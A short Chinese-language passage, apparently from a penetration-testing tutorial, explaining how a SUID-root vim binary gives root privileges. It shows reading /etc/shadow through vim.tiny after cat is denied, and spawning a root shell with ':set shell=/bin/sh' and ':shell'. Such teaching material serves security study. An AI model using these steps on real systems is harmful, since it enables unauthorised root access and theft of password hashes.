Vim的主要用途是用作文本编辑器， 但是，如果以SUID运行，它将继承root用户的权限，因此可以读取系统上的所有文件。
```
# 直接查看 shadow 文件会报错
cat /etc/shadow
cat: /etc/shadow: Permission denied
```
```
# 使用vim.tiny编辑成功
vim.tiny /etc/shadow
```

此外，我们还可以通过Vim运行shell来执行只有root才能完成的操作。

```
vim.tiny
# Press ESC key
:set shell=/bin/sh
:shell
```
